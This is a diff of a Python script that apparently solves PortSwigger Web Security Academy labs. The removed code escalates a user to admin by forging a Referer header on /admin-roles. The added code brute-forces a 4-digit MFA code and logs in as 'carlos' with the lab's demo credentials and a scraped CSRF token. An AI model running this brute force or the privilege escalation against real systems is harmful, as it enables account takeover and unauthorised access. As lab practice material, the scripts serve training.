@@ -1,47 +1,35 @@
-#!/usr/bin/python3.7
-import requests
-import re
-import urllib3
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-from bs4 import BeautifulSoup
+# file = open('4-digit.txt', 'w')
+# for i in range(10000):
+#     if i<10:
+#         file.write('000'+str(i)+'\n')
+#     elif i <100:
+#         file.write('00'+str(i)+'\n')
+#     elif i < 1000:
+#         file.write('0'+str(i)+'\n')
+#     else:
+#         file.write(str(i)+'\n')
 
-url = 'https://0ad200e003f133c9837cce8900e60071.web-security-academy.net'
+import requests
+from tqdm import tqdm
+from bs4 import BeautifulSoup
+file = open('4-digit.txt', 'r').read().splitlines()
+url = 'https://0a1900f2040181ee84ee0f70002d00d3.web-security-academy.net'
+
+for i in tqdm(file):
+    res = requests.post(url,data = {'mfa-code':i})
+    if 'Your username is' in res.text:
+        print(i)
+        break
+s = requests.Session()
+getRes = s.get(url+'/login')
+
+soup = BeautifulSoup(getRes.text, 'html.parser')
 
 data = {
-    'username': 'wiener',
-    'password': 'peter'
+    'csrf': soup.find('input',{'name':'csrf'})['value'],
+    'username': 'carlos',
+    'password': 'montoya'
 }
 
-response = requests.post(
-    url + '/login',
-    data=data,
-    verify=False,
-    allow_redirects=False
-)
-
-session = response.headers['set-cookie'].split(';')[0].split('=')[1]
-
-cookies = {
-    'session': session,
-}
-
-headers = {
-    'Referer': url + '/admin',
-}
-
-params = {
-    'username': 'wiener',
-    'action': 'upgrade',
-}
-
-response = requests.get(
-    url + '/admin-roles',
-    params=params,
-    cookies=cookies,
-    headers=headers,
-    verify=False,
-)
-
-# print(response.text) # hiển thị response có flag
-soup = BeautifulSoup(response.text, 'html.parser')
-print(soup)
+postRes = s.post(url+'/login',data = data)
+print(postRes.cookies)
